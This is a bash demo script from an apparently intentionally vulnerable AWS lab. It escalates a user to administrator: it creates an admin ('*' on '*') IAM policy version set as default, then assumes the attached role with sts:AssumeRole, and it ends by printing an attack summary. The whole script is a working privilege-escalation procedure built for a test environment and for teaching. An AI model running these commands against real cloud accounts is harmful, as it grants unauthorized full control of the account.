#!/bin/bash

# Demo script for iam-createpolicyversion+sts-assumerole privilege escalation
# This scenario demonstrates how a user with iam:CreatePolicyVersion on a customer-managed policy
# attached to a role can create a new policy version with admin permissions, then assume that role for admin access


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-iam-016-to-admin-starting-user"
TARGET_ROLE="pl-prod-iam-016-to-admin-target-role"
TARGET_POLICY="pl-prod-iam-016-to-admin-target-policy"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}iam:CreatePolicyVersion + sts:AssumeRole Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_016_iam_createpolicyversion_sts_assumerole.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_POLICY_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_policy_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo "Target policy ARN: $TARGET_POLICY_ARN"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user and verify identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Get current policy information
echo -e "${YELLOW}Step 5: Getting current policy information${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
echo "Target policy: $TARGET_POLICY_ARN"
echo ""

echo "Policy metadata:"
show_cmd "ReadOnly" "aws iam get-policy --policy-arn $TARGET_POLICY_ARN --query 'Policy.[PolicyName,DefaultVersionId,AttachmentCount]' --output table"
aws iam get-policy \
    --policy-arn $TARGET_POLICY_ARN \
    --query 'Policy.[PolicyName,DefaultVersionId,AttachmentCount]' \
    --output table

echo ""
echo "All policy versions:"
show_cmd "ReadOnly" "aws iam list-policy-versions --policy-arn $TARGET_POLICY_ARN --query 'Versions[*].[VersionId,IsDefaultVersion,CreateDate]' --output table"
aws iam list-policy-versions \
    --policy-arn $TARGET_POLICY_ARN \
    --query 'Versions[*].[VersionId,IsDefaultVersion,CreateDate]' \
    --output table

echo -e "${GREEN}✓ Retrieved policy information${NC}\n"

# [OBSERVATION] Step 6: View current policy document
echo -e "${YELLOW}Step 6: Viewing current policy document (v1)${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
echo "Current default version has minimal permissions:"
echo ""

show_cmd "ReadOnly" "aws iam get-policy --policy-arn $TARGET_POLICY_ARN --query 'Policy.DefaultVersionId' --output text"
CURRENT_VERSION=$(aws iam get-policy \
    --policy-arn $TARGET_POLICY_ARN \
    --query 'Policy.DefaultVersionId' \
    --output text)

show_cmd "ReadOnly" "aws iam get-policy-version --policy-arn $TARGET_POLICY_ARN --version-id $CURRENT_VERSION --query 'PolicyVersion.Document' --output json"
aws iam get-policy-version \
    --policy-arn $TARGET_POLICY_ARN \
    --version-id $CURRENT_VERSION \
    --query 'PolicyVersion.Document' \
    --output json | jq '.'

echo -e "${GREEN}✓ Current policy has no admin permissions${NC}\n"

# [EXPLOIT] Step 7: Create new policy version with admin permissions
echo -e "${YELLOW}Step 7: Creating new policy version with admin permissions${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "This is the privilege escalation action!"
echo ""

# Create admin policy document
ADMIN_POLICY_JSON='{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}'

# Write to temporary file
echo "$ADMIN_POLICY_JSON" > /tmp/admin-policy.json

echo "Creating new policy version v2 with AdministratorAccess permissions..."
show_attack_cmd "Attacker" "aws iam create-policy-version --policy-arn $TARGET_POLICY_ARN --policy-document file:///tmp/admin-policy.json --set-as-default"
aws iam create-policy-version \
    --policy-arn $TARGET_POLICY_ARN \
    --policy-document file:///tmp/admin-policy.json \
    --set-as-default

echo ""
echo -e "${GREEN}✓ Successfully created policy version v2 with admin permissions${NC}"
echo -e "${GREEN}✓ Policy version v2 is now the default version${NC}\n"

# Wait for policy to propagate (15 seconds required for IAM changes)
echo -e "${YELLOW}Waiting 15 seconds for policy to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# [OBSERVATION] Step 8: Verify new policy version
echo -e "${YELLOW}Step 8: Verifying new policy version${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
echo "Updated policy versions:"
show_cmd "ReadOnly" "aws iam list-policy-versions --policy-arn $TARGET_POLICY_ARN --query 'Versions[*].[VersionId,IsDefaultVersion,CreateDate]' --output table"
aws iam list-policy-versions \
    --policy-arn $TARGET_POLICY_ARN \
    --query 'Versions[*].[VersionId,IsDefaultVersion,CreateDate]' \
    --output table

echo ""
echo "New default version (v2) policy document:"
show_cmd "ReadOnly" "aws iam get-policy-version --policy-arn $TARGET_POLICY_ARN --version-id v2 --query 'PolicyVersion.Document' --output json"
aws iam get-policy-version \
    --policy-arn $TARGET_POLICY_ARN \
    --version-id v2 \
    --query 'PolicyVersion.Document' \
    --output json | jq '.'

echo -e "${GREEN}✓ Policy version v2 with admin permissions is now active${NC}\n"

# [EXPLOIT] Step 9: Assume the target role
echo -e "${YELLOW}Step 9: Assuming the target role with admin permissions${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE"
echo "Role ARN: $TARGET_ROLE_ARN"

show_attack_cmd "Attacker" "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name demo-attack-session --query 'Credentials' --output json"
CREDENTIALS=$(aws sts assume-role \
    --role-arn $TARGET_ROLE_ARN \
    --role-session-name demo-attack-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we assumed the role
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed target role${NC}\n"

# [OBSERVATION] Step 10: Verify administrator access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."
echo ""

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (no admin permissions)"
echo "2. Used iam:CreatePolicyVersion to create v2 of $TARGET_POLICY with admin permissions"
echo "3. Policy version v2 automatically became the default version"
echo "4. Used sts:AssumeRole to assume $TARGET_ROLE (which has the policy attached)"
echo "5. Achieved: Full administrative access to the AWS account"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (CreatePolicyVersion) → $TARGET_POLICY v2 → (AssumeRole) → $TARGET_ROLE → Administrator"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Policy version v2 with admin permissions on: $TARGET_POLICY"
echo "- Temporary file: /tmp/admin-policy.json"

echo -e "\n${RED}⚠ Warning: The target policy now has an admin policy version!${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
